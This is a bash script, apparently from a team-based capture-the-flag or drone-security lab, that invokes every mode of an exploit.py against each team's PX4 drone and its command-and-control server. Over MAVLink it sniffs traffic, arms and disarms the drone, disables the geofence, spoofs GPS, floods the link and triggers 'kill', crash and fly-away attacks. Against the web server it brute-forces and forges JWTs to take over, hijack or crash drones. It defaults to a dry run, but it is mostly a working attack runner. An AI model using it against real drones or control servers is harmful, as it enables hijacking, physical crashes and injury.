#!/usr/bin/env bash
# Run every exploit.py attack against each team's range (10.20<team>.5.11).
# Usage:  [TEAMS="1 2"] [DRY_RUN=0] [BLIND=] ./mavlink_attacks.sh
#   TEAMS    space-separated team numbers (default "3")
#   DRY_RUN  1 (default) only prints the commands; 0 actually fires them
#   BLIND    --blind by default (needed off-box, see below); set BLIND= when on the drone host
set -uo pipefail

read -r -a TEAMS <<< "${TEAMS:-3}"
DRY_RUN=${DRY_RUN:-1}

HERE="$(cd "$(dirname "$0")" && pwd)"
EXPLOIT="${EXPLOIT:-$HERE/exploit.py}"

# Off-box, PX4's telemetry broadcast does not cross NAT, so without --blind exploit.py exits on "No matching heartbeat".
BLIND=${BLIND:---blind}

run() { echo "+ $*"; [ "$DRY_RUN" = "0" ] && "$@"; }

echo "requires pymavlink (pip install -r $HERE/requirements.txt)"

for i in "${TEAMS[@]}"; do
    DRONE="10.20${i}.5.11"
    MAVLINK_PORT=14550
    C2="10.20${i}.5.11"

    echo "=== team ${i} ==="

    echo "--- mavlink ---"

    echo "recon"
    run python3 "$EXPLOIT" recon --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" $BLIND

    echo "sniff"
    run python3 "$EXPLOIT" sniff --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" --seconds 20 $BLIND

    echo "arm"
    run python3 "$EXPLOIT" arm --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" $BLIND

    echo "disarm"
    run python3 "$EXPLOIT" disarm --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" $BLIND

    echo "mode"
    run python3 "$EXPLOIT" mode --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" --mode LAND $BLIND

    echo "rtl"
    run python3 "$EXPLOIT" rtl --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" $BLIND

    echo "reposition"
    run python3 "$EXPLOIT" reposition --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" --lat 47.398 --lon 8.546 --alt 50 $BLIND

    echo "waypoint"
    run python3 "$EXPLOIT" waypoint --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" $BLIND

    echo "param"
    run python3 "$EXPLOIT" param --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" --name FENCE_ENABLE --value 0 $BLIND

    echo "gpsspoof"
    run python3 "$EXPLOIT" gpsspoof --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" --lat 47.398 --lon 8.546 --alt 85 --seconds 20 $BLIND

    echo "flood"
    run python3 "$EXPLOIT" flood --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" --seconds 10 $BLIND

    echo "--- destructive ---"

    echo "kill"
    run python3 "$EXPLOIT" kill --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" $BLIND

    echo "mavcrash"
    run python3 "$EXPLOIT" mavcrash --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" $BLIND

    echo "mavflyaway"
    run python3 "$EXPLOIT" mavflyaway --mavlink-host "$DRONE" --mavlink-port "$MAVLINK_PORT" $BLIND

    echo "--- app layer ---"

    echo "scan"
    run python3 "$EXPLOIT" scan "$C2"

    echo "dronepower"
    run python3 "$EXPLOIT" dronepower --drone-host "$C2" --drone-port 9100

    echo "brute"
    run python3 "$EXPLOIT" brute --c2-host "$C2" --c2-port 8000 --user admin

    echo "jwtforge"
    run python3 "$EXPLOIT" jwtforge --c2-host "$C2" --c2-port 8000 --user admin

    echo "takeover"
    run python3 "$EXPLOIT" takeover --c2-host "$C2" --c2-port 8000 --drone 0

    echo "enum"
    run python3 "$EXPLOIT" enum --c2-host "$C2" --c2-port 8000

    echo "hijack"
    run python3 "$EXPLOIT" hijack --c2-host "$C2" --c2-port 8000 --route perimeter

    echo "crashinto"
    run python3 "$EXPLOIT" crashinto --c2-host "$C2" --c2-port 8000 --drone 0

    echo "flyaway"
    run python3 "$EXPLOIT" flyaway --c2-host "$C2" --c2-port 8000 --drone 0
done
